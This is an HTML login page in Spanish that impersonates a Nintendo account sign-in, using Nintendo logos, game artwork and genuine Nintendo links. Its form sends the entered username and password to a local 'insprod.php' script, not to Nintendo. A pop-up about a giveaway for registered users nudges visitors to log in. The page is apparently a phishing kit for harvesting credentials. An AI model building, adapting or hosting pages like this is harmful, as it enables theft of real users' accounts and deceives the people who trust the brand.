<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cuenta Nintendo</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
</head>
<body class="new">
    <div class="sidebar">
        <a href="index.php"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0d/Nintendo.svg/320px-Nintendo.svg.png" alt="Nintendo Logo" class="nintendo-logo"></a>
        <ul>
            <li><i class="bi bi-star-half text-white" style="font-size: 2.5rem;"></i> Juegos</li>
            <li><i class="bi bi-dpad-fill text-white" style="font-size: 2.5rem;"></i> Hardware</li>
            <li><i class="bi bi-nintendo-switch text-white" style="font-size: 2.5rem;"></i> Nintendo Switch Online</li>
            <li><i class="bi bi-bag text-white" style="font-size: 2.5rem;"></i> Nintendo eShop</li>
            <li><i class="bi bi-people-fill text-white" style="font-size: 2.5rem;"></i> Síguenos</li>
        </ul>
    </div>
    <div class="content">
        <div class="navbar">
            <div class="actions">
                <a href="#"><div><center> <i class="bi bi-search text-white"></i><br>Buscar</center></div></a>
                <a href="index.php"><div><center><i class="bi bi-heart text-white"></center></i>Lista de deseos</div></a>
                <a href="login.php"><div><center><i class="bi bi-person-fill text-white"></center></i>Iniciar sesión</div></a>
            </div>
        </div>
        <div class="main-content">
            <div class="news-section">
              <br><br><br>
                <div class="container">
                    <div class="login-container">
                        <div class="login-header">
                            <h2>Inicia sesión en <img src="img/logo-nintendo.png" alt="Nintendo Logo" class="login-logo"></h2>
                        </div>
                        <form id="loginForm" method="post" action="insprod.php">
                            <div class="form-group">
                                <label for="usuario">Usuario o correo electrónico</label>
                                <input type="text" id="usuario" name="usuario" placeholder="Introduce tu usuario o email" required>
                                <div class="input-icon">
                                    <i class="bi bi-person-fill"></i>
                                </div>
                            </div>
                            
                            <div class="form-group" style="position: relative;">
                                <label for="contraseña">Contraseña</label>
                                     <input type="password" id="contraseña" name="contraseña" placeholder="Introduce tu contraseña" required>
    
                                    <div class="input-icon">
                                         <i class="bi bi-lock-fill"></i>
                                    </div>

    <!-- Icono para mostrar/ocultar contraseña -->
                                    <i class="bi bi-eye-fill" id="togglePass" onclick="togglePassword()" 
                                    style="position: absolute; right: 10px; top: 38px; cursor: pointer;"></i>

                                    <a href="https://accounts.nintendo.com/password/reset" class="forgot-password">¿Has olvidado tu contraseña?</a>
                            </div>

                            
                            <div class="form-options">
                                <div class="remember-me">
                                    <input type="checkbox" id="rememberMe" name="rememberMe">
                                    <label for="rememberMe">Recordar usuario</label>
                                </div>
                            </div>
                            
                            <button type="submit" class="login-button">
                                <i class="bi bi-arrow-right"></i> Iniciar sesión
                            </button>
                            
                            <div class="register-link">
                                ¿No tienes cuenta? <a onclick="return confirm('Este sorteo solo está disponible para usuarios ya registrados. ¿Deseas registrarte? Puede que pierdas esta oportunidad.')" href="https://accounts.nintendo.com/authorize_age_gate?redirect_uri=https%3A%2F%2Faccounts.nintendo.com%2Fconnect%2F1.0.0%2Fauthorize%3Fresponse_type%3Dcode%2Bid_token%2Btoken%26client_id%3Df9a80c41a802ed10%26redirect_uri%3Dhttps%253A%252F%252Fwww.nintendo.com%26scope%3DeshopDemo%2BeshopDevice%2BeshopPrice%2BmissionStatus%2BmissionStatus%253Aprogress%2Bopenid%2BpointWallet%2Buser%2Buser.birthday%2Buser.email%2Buser.links%255B%255D.id%2Buser.membership%2Buser.mii%2Buser.wishlist%2BuserNotificationMessage%253AanyClients%2BuserNotificationMessage%253AanyClients%253Awrite%26state%3Dd3366f0106d19a4b8dfb027faa79f7e3%26response_mode%3Dweb_message%26web_message_uri%3Dhttps%253A%252F%252Faccounts.nintendo.com%26web_message_target%3Dop-frame%26prompt%3Dconsent%26interacted%3D1">Regístrate ahora</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
      document.addEventListener('DOMContentLoaded', function() {
  const usernameInput = document.getElementById('usuario');
  const passwordInput = document.getElementById('contraseña');
  const body = document.body;
  const loginContainer = document.querySelector('.login-container');
  
  // Imágenes de fondo
  const backgrounds = {
    user: "https://www.nintendo.com/eu/media/images/10_share_images/games_15/nintendo_switch_4/2x1_NSwitch_SuperMarioPartyJamboree_image1600w.jpg",
    pass: "https://www.nintendo.com/eu/media/images/assets/nintendo_switch_2_games/thelegendofzeldatearsofthekingdomnintendoswitch2edition/2x1_HP_NSwitch2_TLoZTotKN.jpg"
  };
  
  // Fondo temporal mientras cambia
  const tempBg = document.createElement('div');
  tempBg.style.position = 'fixed';
  tempBg.style.top = '0';
  tempBg.style.left = '0';
  tempBg.style.width = '100%';
  tempBg.style.height = '100%';
  tempBg.style.backgroundSize = 'cover';
  tempBg.style.backgroundPosition = 'center';
  tempBg.style.zIndex = '-1';
  tempBg.style.opacity = '0';
  tempBg.style.transition = 'opacity 0.5s ease';
  document.body.appendChild(tempBg);
  
  // Hacer el login-container semi-transparente
  loginContainer.style.backgroundColor = 'rgba(255, 255, 255, 0.9)';
  
  // Cambiar fondo al enfocar usuario
  usernameInput.addEventListener('focus', function() {
    tempBg.style.backgroundImage = `url('${backgrounds.user}')`;
    tempBg.style.opacity = '1';
    tempBg.style.transition = 'opacity 0.5s ease';
  });
  
  // Cambiar fondo al enfocar contraseña
  passwordInput.addEventListener('focus', function() {
    tempBg.style.backgroundImage = `url('${backgrounds.pass}')`;
    tempBg.style.opacity = '1';
    tempBg.style.transition = 'opacity 0.5s ease';
  });
  
  // Restaurar al salir de los campos
  usernameInput.addEventListener('blur', function() {
    tempBg.style.opacity = '0';
  });
  
  passwordInput.addEventListener('blur', function() {
    tempBg.style.opacity = '0';
  });
});

//
function togglePassword() {
    const pass = document.getElementById('contraseña');
    const icon = document.getElementById('togglePass');
    if (pass.type === 'password') {
        pass.type = 'text';
        icon.classList.remove('bi-eye-fill');
        icon.classList.add('bi-eye-slash-fill');
    } else {
        pass.type = 'password';
        icon.classList.remove('bi-eye-slash-fill');
        icon.classList.add('bi-eye-fill');
    }
}
    </script>
</body>
</html>